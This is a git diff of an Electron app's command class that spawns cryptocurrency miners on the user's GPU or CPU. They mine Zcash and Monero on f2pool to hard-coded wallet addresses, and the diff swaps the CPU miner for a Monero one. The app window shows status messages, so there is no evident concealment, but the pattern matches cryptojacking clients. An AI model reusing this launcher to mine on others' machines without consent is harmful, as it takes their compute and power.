@@ -1,7 +1,6 @@
 import child from 'child_process';
 import config from "./config";
 import { app } from 'electron';
-const fs = require("fs");
 
 class Cmd {
     start(name, power) {
@@ -35,7 +34,7 @@ class Cmd {
         app.mainWindow.send('card-check', `检测A卡:${config.root}----${__dirname}------${process.cwd()}`);
         config.gpu = "Acard";
         let proc = child.spawn(`ZecMiner64.exe`, [
-			"-zpool", `zec.f2pool.com:3357`,
+            "-zpool", `zec.f2pool.com:3357`,
             "-zwal", `t1MnvXFuqWnCtmepFaGXh2r4NBm4Nb9riyg.${this.name}`,
             "-zpsw", `z`,
             "-i", `${this.power}`,
@@ -92,7 +91,12 @@ class Cmd {
         config.gpu = "Cpu";
         config.save();
         app.mainWindow.send('card-use', '使用Cpu');
-        let proc = child.spawn(`nheqminer.exe`, [`-u`, `t1MnvXFuqWnCtmepFaGXh2r4NBm4Nb9riyg.${this.name}`, `-l`, `zec.f2pool.com:3357`, `-t`, `${this.power}`], { cwd: config.root + "/cmd/cpu/" });
+        // let proc = child.spawn(`nheqminer.exe`, [`-u`, `t1MnvXFuqWnCtmepFaGXh2r4NBm4Nb9riyg.${this.name}`, `-l`, `zec.f2pool.com:3357`, `-t`, `${this.power}`], { cwd: config.root + "/cmd/cpu/" });
+        let proc = child.spawn(`NsCpuCNMiner64.exe`, [
+            "-o", "stratum+tcp://xmr.f2pool.com:13531",
+            "-u", `4LYWaNAqVLsD2BoEqi64szTFV64R8xz7QPhxgHFeDrrPU5nii5uWGXh128UUYXayQHFUrjojugSByAyf2VHatc9gLA6htW8TvHJNWeiVyC.${this.name}`,
+            "-p", "x"
+        ], { cwd: config.root + "/cmd/cpu/" });
         this.proc = proc;
         this.proc.once("error", err => {
             if (this.proc == proc) {
